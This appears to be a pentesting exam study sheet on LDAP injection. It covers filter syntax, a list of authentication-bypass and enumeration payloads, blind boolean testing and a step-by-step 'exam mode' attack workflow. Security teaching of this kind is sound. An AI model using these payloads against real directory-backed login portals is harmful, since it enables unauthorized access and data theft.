## Advanced Injection Attacks — LDAP Injection

## Objective
Exploit LDAP query construction to:
- Bypass authentication
- Extract directory data
- Manipulate search filters

Think: *“Can I alter the LDAP filter logic?”*

---

## 1. LDAP Basics

### LDAP Query Format

```text
(attribute=value)
```

---

### Example

```text
(&(username=admin)(password=123456))
```

- `&` = AND
- `|` = OR
- `!` = NOT

---

## 2. Where to Find LDAP

- Authentication systems (Active Directory)
- Corporate login portals
- SSO integrations

---

## 3. Injection Point

User input inserted into filter:

```text
(&(username=<input>)(password=<input>))
```

---

## 4. Authentication Bypass

### A. Always true condition

```text
username=admin)(|(password=*))
```

---

### Resulting query

```text
(&(username=admin)(|(password=*)))
```

→ Matches any password

---

### B. Wildcard injection

```text
password=*
```

→ Matches any value

---

## 5. Common Payloads

### Basic bypass

```text
*)(|(uid=*
```

---

### Close and inject

```text
admin)(&
```

---

### OR condition

```text
*)(|(username=admin))
```

---

## 6. Data Extraction

### Enumerate users

```text
(uid=*)
```

---

### Search all entries

```text
(|(uid=*)(cn=*))
```

---

## 7. Blind LDAP Injection

### Boolean-based

```text
(uid=admin*)
(uid=invalid*)
```

→ Compare responses

---

## 8. Special Characters

LDAP meta-characters:

```text
* ( ) & | !
```

---

### Escaping issues

If not properly escaped → injection possible

---

## 9. Indicators of Vulnerability

- Login bypass with wildcard
- Different results based on filter
- Unexpected directory data returned
- No sanitization of special chars

---

## 10. Fast Workflow (Exam Mode)

1. Identify LDAP usage (login / directory)
2. Test basic payload:

```text
*
```

3. Try bypass:

```text
*)(|(uid=*
```

4. Observe:
   - login success?
   - data returned?
5. Refine payload
6. Confirm injection

---

## 11. Mental Model

LDAP queries are structured filters.

You are not injecting SQL,
you are reshaping logic:

- Close condition
- Add new condition
- Force match

Your job:
→ Break structure → Control filter → Bypass auth